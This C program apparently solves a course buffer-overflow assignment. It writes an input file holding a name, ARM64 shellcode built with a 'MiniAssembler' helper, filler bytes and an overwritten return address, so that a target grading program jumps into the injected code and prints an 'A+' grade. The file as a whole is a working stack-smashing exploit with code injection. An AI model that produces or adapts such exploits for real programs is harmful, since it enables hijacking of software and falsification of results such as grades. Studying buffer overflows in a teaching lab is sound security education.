#include <stdio.h>
#include "miniassembler.h"

int main(void) {
    FILE *psFile;
    unsigned int uiAdr;
    unsigned int uiMov;
    unsigned int uiStrb;
    unsigned int uiB;
    unsigned int uiBl;
    unsigned long ulAddress;
    char* name = "Josh";
    int i;

    psFile = fopen("dataAplus", "w");

    for (i = 0; i < 5; i++) {
        char n = *name;
        /* fwrite(&n, sizeof(char), 1, psFile); */
        fprintf(psFile, "%c", n);
        name++;
    }

    fprintf(psFile, "A+");
    putc('\0', psFile);

    /* adr x0, grade */
    uiAdr = MiniAssembler_adr(0, 0x420044, 0x420060);
    fwrite(&uiAdr, sizeof(unsigned int), 1, psFile);

    /* mov x1, '\0' */
    uiMov = MiniAssembler_mov(1, '\0');
    fwrite(&uiMov, sizeof(unsigned int), 1, psFile);

    /* strb x1, [x0] */
    uiStrb = MiniAssembler_strb(1, 0);
    fwrite(&uiStrb, sizeof(unsigned int), 1, psFile);

    /* adr x0, "A+" */
    uiAdr = MiniAssembler_adr(0, 0x42005d, 0x42006c);
    fwrite(&uiAdr, sizeof(unsigned int), 1, psFile);

    /* bl printf */
    uiBl = MiniAssembler_bl(0x400600, 0x420070);
    fwrite(&uiBl, sizeof(unsigned int), 1, psFile);

    /* b 0x400864 */
    uiB = MiniAssembler_b(0x400864, 0x420074);
    fwrite(&uiB, sizeof(unsigned int), 1, psFile);

    /* filler to overflow buffer */
    for (i = 0; i < 16; i++) {
        fprintf(psFile, "%c", 'a');
    }

    ulAddress = 0x420060;

    fwrite(&ulAddress, sizeof(unsigned long), 1, psFile);
    fclose(psFile);
    return 0;
}
